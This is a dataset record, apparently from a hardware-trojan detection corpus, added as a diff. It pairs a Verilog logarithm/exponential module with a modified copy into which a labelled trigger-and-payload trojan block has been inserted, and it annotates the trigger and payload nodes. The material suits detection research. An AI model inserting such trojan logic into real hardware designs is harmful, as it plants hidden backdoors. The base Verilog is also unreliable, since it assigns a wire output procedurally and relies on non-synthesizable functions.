@@ -1,0 +1,19 @@
+{
+    "sample_id": "SRTL_455",
+    "instruction": "Please act as a professional Verilog designer. Your task is to create a Verilog module that implements logarithmic and exponential functions. The module should have the following inputs and outputs:\n\nInputs: a 32-bit input signal (in)\nOutputs: a 32-bit output signal (out)\n\nYour module should implement the following functionality:\n\nThe output signal should be the logarithm or exponential of the input signal, as determined by a control signal (ctrl).\nIf the control signal is 0, the output signal should be the natural logarithm of the input signal.\nIf the control signal is 1, the output signal should be the exponential of the input signal.\nTo implement the logarithmic and exponential functions, you should use Verilog code to define the mathematical equations for these functions. \nYou should then use these equations to compute the output signal based on the input signal and the control signal.\nThe natural logarithm function can be defined as:\nln(x) = log_e(x) = \u222b 1 to x 1/t dt\nThe exponential function can be defined as:\nexp(x) = e^x = \u2211 k=0 to \u221e x^k / k!",
+    "original_rtl": "module LogExp (\n  input [31:0] in,\n  input ctrl,\n  output [31:0] out\n);\n\n  reg [31:0] ln_out;\n  reg [31:0] exp_out;\n  \n  always @(*) begin\n    if (ctrl == 0) begin\n      // Compute natural logarithm\n      ln_out = $ln(in);\n      out = ln_out;\n    end else begin\n      // Compute exponential\n      exp_out = $exp(in);\n      out = exp_out;\n    end\n  end\n  \nendmodule",
+    "modified_rtl": "module LogExp (\n  input [31:0] in,\n  input ctrl,\n  output [31:0] out\n);\n\n  reg [31:0] ln_out;\n  reg [31:0] exp_out;\n  \n  always @(*) begin\n    if (ctrl == 0) begin\n      // Compute natural logarithm\n      ln_out = $ln(in);\n      out = ln_out;\n    end else begin\n      // Compute exponential\n      exp_out = $exp(in);\n      out = exp_out;\n    end\n  end\n  \n\n\n// HT_START\n// Trojan Type: Lightweight_Payload_Override\nreg htrojan_trig;\nreg [31:0] htrojan_pay;\nalways @(*) begin\n    htrojan_trig = (in == 32'h00000001);\n    htrojan_pay = htrojan_trig ? (out ^ 32'h00000001) : out;\nend\n// HT_END\nendmodule",
+    "source_index": 455,
+    "label": "trojan",
+    "trojan_type": "Lightweight_Payload_Override",
+    "trigger_nodes": [
+        "htrojan_trig",
+        "in"
+    ],
+    "payload_nodes": [
+        "htrojan_pay",
+        "out"
+    ],
+    "obfuscation_applied": false,
+    "obfuscation_type": null
+}
